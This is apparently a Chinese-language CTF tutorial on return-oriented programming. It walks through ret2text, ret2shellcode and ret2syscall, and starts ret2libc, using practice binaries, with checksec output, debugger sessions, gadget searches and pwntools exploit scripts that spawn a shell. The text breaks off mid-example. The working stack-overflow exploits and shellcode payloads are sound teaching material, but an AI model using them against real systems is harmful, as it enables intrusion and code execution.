    <content type="html"><![CDATA[<p>​随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>首先，查看一下程序的保护机制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  ret2text checksec ret2text<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure><p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [sp+1Ch] [bp-64h]@1</span><br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is something amazing here, do you know anything?&quot;</span>);<br>  <span class="hljs-built_in">gets</span>((<span class="hljs-type">char</span> *)&amp;v4);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:080485FD secure          proc near<br>.text:080485FD<br>.text:080485FD input           = dword ptr -10h<br>.text:080485FD secretcode      = dword ptr -0Ch<br>.text:080485FD<br>.text:080485FD                 push    ebp<br>.text:080485FE                 mov     ebp, esp<br>.text:08048600                 sub     esp, 28h<br>.text:08048603                 mov     dword ptr [esp], 0 ; timer<br>.text:0804860A                 call    _time<br>.text:0804860F                 mov     [esp], eax      ; seed<br>.text:08048612                 call    _srand<br>.text:08048617                 call    _rand<br>.text:0804861C                 mov     [ebp+secretcode], eax<br>.text:0804861F                 lea     eax, [ebp+input]<br>.text:08048622                 mov     [esp+4], eax<br>.text:08048626                 mov     dword ptr [esp], offset unk_8048760<br>.text:0804862D                 call    ___isoc99_scanf<br>.text:08048632                 mov     eax, [ebp+input]<br>.text:08048635                 cmp     eax, [ebp+secretcode]<br>.text:08048638                 jnz     short locret_8048646<br>.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;<br>.text:08048641                 call    _system<br></code></pre></td></tr></table></figure><p>在 secure 函数又发现了存在调用 system(“&#x2F;bin&#x2F;sh”) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。</p><p>下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:080486A7                 lea     eax, [esp+1Ch]<br>.text:080486AB                 mov     [esp], eax      ; s<br>.text:080486AE                 call    _gets<br></code></pre></td></tr></table></figure><p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gef➤  b *0x080486AE<br>Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.<br>gef➤  r<br>There is something amazing here, do you know anything?<br><br>Breakpoint 1, 0x080486ae in main () at ret2text.c:24<br>24      gets(buf);<br>───────────────────────────────────────────────────────────────────────[ registers ]────<br>$eax   : 0xffffcd5c  →  0x08048329  →  &quot;__libc_start_main&quot;<br>$ebx   : 0x00000000<br>$ecx   : 0xffffffff<br>$edx   : 0xf7faf870  →  0x00000000<br>$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  &quot;__libc_start_main&quot;<br>$ebp   : 0xffffcdc8  →  0x00000000<br>$esi   : 0xf7fae000  →  0x001b1db0<br>$edi   : 0xf7fae000  →  0x001b1db0<br>$eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;<br></code></pre></td></tr></table></figure><p>可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断</p><ul><li>s 的地址为 0xffffcd5c</li><li>s 相对于 ebp 的偏移为 0x6c</li><li>s 相对于返回地址的偏移为 0x6c+4</li></ul><p>最后的 payload 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br>target = <span class="hljs-number">0x804863a</span><br>sh.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>) + p32(target))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>首先检测程序开启的保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  ret2shellcode checksec ret2shellcode<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x8048000)<br>    RWX:      Has RWX segments<br></code></pre></td></tr></table></figure><p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [sp+1Ch] [bp-64h]@1</span><br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No system for you this time !!!&quot;</span>);<br>  <span class="hljs-built_in">gets</span>((<span class="hljs-type">char</span> *)&amp;v4);<br>  <span class="hljs-built_in">strncpy</span>(buf2, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v4, <span class="hljs-number">0x64</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bye bye ~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.bss:0804A080                 public buf2<br>.bss:0804A080 ; char buf2[100]<br></code></pre></td></tr></table></figure><p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gef➤  b main<br>Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.<br>gef➤  r<br>Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode <br><br>Breakpoint 1, main () at ret2shellcode.c:8<br>8       setvbuf(stdout, 0LL, 2, 0LL);<br>─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────<br>      6  int main(void)<br>      7  &#123;<br> →    8      setvbuf(stdout, 0LL, 2, 0LL);<br>      9      setvbuf(stdin, 0LL, 1, 0LL);<br>     10  <br>─────────────────────────────────────────────────────────────────────[ trace ]────<br>[#0] 0x8048536 → Name: main()<br>─────────────────────────────────────────────────────────────────────────────────────────────────────<br>gef➤  vmmap <br>Start      End        Offset     Perm Path<br>0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode<br>0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode<br>0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode<br>0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so<br>0xf7faf000 0xf7fb2000 0x00000000 rwx <br>0xf7fd3000 0xf7fd5000 0x00000000 rwx <br>0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]<br>0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]<br>0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffb000 0xf7ffc000 0x00000000 rwx <br>0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so<br>0xfffdd000 0xffffe000 0x00000000 rwx [stack]<br></code></pre></td></tr></table></figure><p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode<br></code></pre></td></tr></table></figure><p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p><p>具体的 payload 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">&#x27;A&#x27;</span>) + p32(buf2_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p><p>首先检测程序开启的保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  ret2syscall checksec rop<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure><p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [sp+1Ch] [bp-64h]@1</span><br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you plan to do?&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(&amp;v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。</p><p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>)<br></code></pre></td></tr></table></figure><p>其中，该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。<strong>但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制</strong>，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><p>首先，我们来寻找控制 eax 的 gadgets</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;<br>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x080bb196 : pop eax ; ret<br>0x0807217a : pop eax ; ret 0x80e<br>0x0804f704 : pop eax ; ret 3<br>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br></code></pre></td></tr></table></figure><p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。</p><p>类似的，我们可以得到控制其它寄存器的 gadgets</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;<br>0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret<br>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret<br>0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret<br>0x080be23f : pop ebx ; pop edi ; ret<br>0x0806eb69 : pop ebx ; pop edx ; ret<br>0x08092258 : pop ebx ; pop esi ; pop ebp ; ret<br>0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10<br>0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14<br>0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc<br>0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4<br>0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8<br>0x08048913 : pop ebx ; pop esi ; pop edi ; ret<br>0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4<br>0x08049a94 : pop ebx ; pop esi ; ret<br>0x080481c9 : pop ebx ; ret<br>0x080d7d3c : pop ebx ; ret 0x6f9<br>0x08099c87 : pop ebx ; ret 8<br>0x0806eb91 : pop ecx ; pop ebx ; ret<br>0x0806336b : pop edi ; pop esi ; pop ebx ; ret<br>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<br>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret<br>0x0805c820 : pop esi ; pop ebx ; ret<br>0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0807b6ed : pop ss ; pop ebx ; ret<br></code></pre></td></tr></table></figure><p>这里，我选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<br></code></pre></td></tr></table></figure><p>这个可以直接控制其它三个寄存器。</p><p>此外，我们需要获得 &#x2F;bin&#x2F;sh 字符串对应的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  ret2syscall ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; <br>Strings information<br>============================================================<br>0x080be408 : /bin/sh<br></code></pre></td></tr></table></figure><p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  ret2syscall ROPgadget --binary rop  --only &#x27;int&#x27;                 <br>Gadgets information<br>============================================================<br>0x08049421 : int 0x80<br>0x080938fe : int 0xbb<br>0x080869b5 : int 0xf6<br>0x0807b4d4 : int 0xfc<br><br>Unique gadgets found: 4<br></code></pre></td></tr></table></figure><p>同时，也找到对应的地址了。</p><p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>binsh = <span class="hljs-number">0x80be408</span><br>payload = flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh, int_0x80])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。</p><h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p>我们由简单到难分别给出三个例子。</p><h4 id="例-1"><a href="#例-1" class="headerlink" title="例 1"></a>例 1</h4><p>首先，我们可以检查一下程序的安全保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  ret2libc1 checksec ret2libc1    <br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure><p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [sp+1Ch] [bp-64h]@1</span><br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);<br>  <span class="hljs-built_in">gets</span>((<span class="hljs-type">char</span> *)&amp;v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 &#x2F;bin&#x2F;sh 存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  ret2libc1 ROPgadget --binary ret2libc1 --string &#x27;/bin/sh&#x27;          <br>Strings information<br>============================================================<br>0x08048720 : /bin/sh<br></code></pre></td></tr></table></figure><p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 